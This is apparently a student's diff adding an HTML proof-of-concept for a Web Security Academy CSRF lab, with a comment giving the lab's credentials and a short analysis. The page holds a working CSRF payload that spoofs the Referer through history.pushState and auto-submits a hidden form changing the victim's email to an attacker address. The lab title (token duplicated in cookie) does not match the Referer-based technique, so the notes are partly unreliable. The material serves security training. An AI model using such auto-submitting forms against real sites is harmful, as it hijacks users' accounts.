@@ -1,0 +1,33 @@
+<html>
+        <!--
+            Lab #8 - CSRF where token is duplicated in cookie
+
+            Vulnerable parametr - email change functionality
+
+            Goal - exploit CSRF to change email address
+
+            Creds - wiener:peter
+
+            Analysis:
+
+            In order for a CSRF attack to be possible:
+            - A relevant action: change a users email
+            - Cookie-based session handlinf: session cookie
+            - No unpredictable request parameter: no csrf token
+
+            Testing Referer header for CSRF attacks:
+            1. Remove the Referer header
+            2. Check which portion of the referrer header is the application validating
+        -->
+        <body>
+        <!-- Referrer-Policy: unsafe-url -->
+        <script>history.pushState('', '', '/?ac161fbd1eb1959bc0f403fe000400f0.web-security-academy.net')</script> <!-- 1. State object, 2. Title 3. URL -->
+        <form action="ac161fbd1eb1959bc0f403fe000400f0.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="sarlot@hacker.com"/>
+            <input type="submit" value="Submit request"/>
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
